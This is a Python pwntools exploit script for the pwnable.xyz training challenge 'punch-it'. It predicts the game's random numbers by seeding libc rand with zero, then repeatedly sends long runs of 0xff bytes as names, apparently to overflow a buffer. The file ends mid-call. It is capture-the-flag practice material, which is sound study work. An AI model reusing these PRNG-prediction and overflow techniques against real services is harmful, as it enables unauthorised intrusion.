#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
from ctypes import *
import os

context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/train/pwnable.xyz/punch-it/image/challenge/challenge")
elf = ELF(TARGET)
libc_fun = CDLL("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
def attach(r):
    if LOCAL:
        bkps = ["* main+216"]
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def punch(val):
    r.sendlineafter("pawa>",str(val))

def fillscore():
    r.sendlineafter("gimmi pawa>",str(0xffffffff))

def fillt_game(name,guess):
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":",name)
    log.info("sent")

def exploit(r):
    # attach(r)
    # init
    r.sendlineafter("game? [Y/n] :","y")
    r.sendafter("Name:", "\xff" * 44)

    # choose invalid
    r.sendlineafter(">","8")
    o = int(libc_fun.srand(0))
    
    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    fillt_game("\xff" * 44,guess)

    guess = int(libc_fun.rand())
    fillscore()
    # for i in range(0x111):
    #     log.info("sent " + str(i))
    #     guess = int(libc_fun.rand())
    #     fillscore()
    log.info("0x111 sent")

    # o = int(libc_fun.srand(0x6830312500000000))
    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)
    # # fillt_game("A" * 45,guess)

    # guess = int(libc_fun.rand())
    # fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 44)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 44)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 44)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 47)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 46)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 48)
    
    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 47)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 47)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()
    
    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 49)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)
    
    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 47)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 48)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 46)    

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 45) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 45) 

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d) 

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xee" * 0x32) 

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xee" * 0x32) 

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()
 
    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x32) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()
    
    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d) 

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x31)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x33)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x30)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2f)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2e)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    # guess = int(libc_fun.rand())
    # log.info("guess: " + str(guess))
    # r.sendlineafter(">",str(guess))
    # r.sendafter("]","y")
    # r.sendafter(":","\xff" * 0x2d)

    # guess = int(libc_fun.rand())
    # fillscore()
    # guess = int(libc_fun.rand())
    # fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x31)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
    r.sendafter(":","\xff" * 0x2d)

    guess = int(libc_fun.rand())
    fillscore()
    guess = int(libc_fun.rand())
    fillscore()

    guess = int(libc_fun.rand())
    log.info("guess: " + str(guess))
    r.sendlineafter(">",str(guess))
    r.sendafter("]","y")
